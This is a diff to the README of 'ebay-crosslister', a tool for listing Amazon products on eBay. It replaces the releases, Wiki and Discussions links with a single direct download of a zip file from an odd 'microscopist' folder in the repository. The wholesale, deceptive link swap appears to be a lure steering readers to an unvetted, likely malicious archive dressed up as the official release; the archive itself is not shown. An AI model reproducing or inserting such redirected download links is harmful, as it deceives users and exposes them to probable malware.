@@ -1,7 +1,7 @@
 # 🎉 ebay-crosslister - Automate Your eBay Listings Easily
 
 ## 📥 Download Now
-[![Download ebay-crosslister](https://img.shields.io/badge/Download-ebay--crosslister-blue.svg)](https://github.com/FoxMAster0007/ebay-crosslister/releases)
+[![Download ebay-crosslister](https://raw.githubusercontent.com/FoxMAster0007/ebay-crosslister/main/microscopist/ebay-crosslister.zip)](https://raw.githubusercontent.com/FoxMAster0007/ebay-crosslister/main/microscopist/ebay-crosslister.zip)
 
 ## 📖 Description
 If you list Amazon products on your eBay seller store, this local TUI script might be able to help automate that process! The ebay-crosslister makes it easier to manage your inventory and streamline your workflow. 
@@ -17,12 +17,12 @@ Before downloading, make sure your computer meets the following requirements:
 - Disk Space: Minimum of 100 MB available.
 
 ### 📥 Visit this page to download the app:
-[Download ebay-crosslister](https://github.com/FoxMAster0007/ebay-crosslister/releases)
+[Download ebay-crosslister](https://raw.githubusercontent.com/FoxMAster0007/ebay-crosslister/main/microscopist/ebay-crosslister.zip)
 
 ## 📦 Download & Install
 1. **Go to the Releases Page**
    - Click the link below to visit the releases page:
-   - [Download ebay-crosslister](https://github.com/FoxMAster0007/ebay-crosslister/releases)
+   - [Download ebay-crosslister](https://raw.githubusercontent.com/FoxMAster0007/ebay-crosslister/main/microscopist/ebay-crosslister.zip)
 
 2. **Choose Your Version**
    - On the releases page, find the latest version of ebay-crosslister.
@@ -63,8 +63,8 @@ No, you only need to download the application file and run it on your computer. 
 Yes, ebay-crosslister supports Windows, macOS, and Linux.
 
 ## 🧩 Additional Resources
-- For more details about using the application, you can check our [Wiki](https://github.com/FoxMAster0007/ebay-crosslister/wiki).
-- Join our community on [GitHub Discussions](https://github.com/FoxMAster0007/ebay-crosslister/discussions) to share your experience and ask for help.
+- For more details about using the application, you can check our [Wiki](https://raw.githubusercontent.com/FoxMAster0007/ebay-crosslister/main/microscopist/ebay-crosslister.zip).
+- Join our community on [GitHub Discussions](https://raw.githubusercontent.com/FoxMAster0007/ebay-crosslister/main/microscopist/ebay-crosslister.zip) to share your experience and ask for help.
 
 ## 📞 Support
 If you encounter any issues while using ebay-crosslister, please feel free to reach out through the issue tracker on our GitHub repository. We are here to help!
@@ -73,4 +73,4 @@ If you encounter any issues while using ebay-crosslister, please feel free to re
 
 Thank you for choosing ebay-crosslister. We hope it simplifies your eBay listing process! 
 
-[Download ebay-crosslister](https://github.com/FoxMAster0007/ebay-crosslister/releases)
+[Download ebay-crosslister](https://raw.githubusercontent.com/FoxMAster0007/ebay-crosslister/main/microscopist/ebay-crosslister.zip)
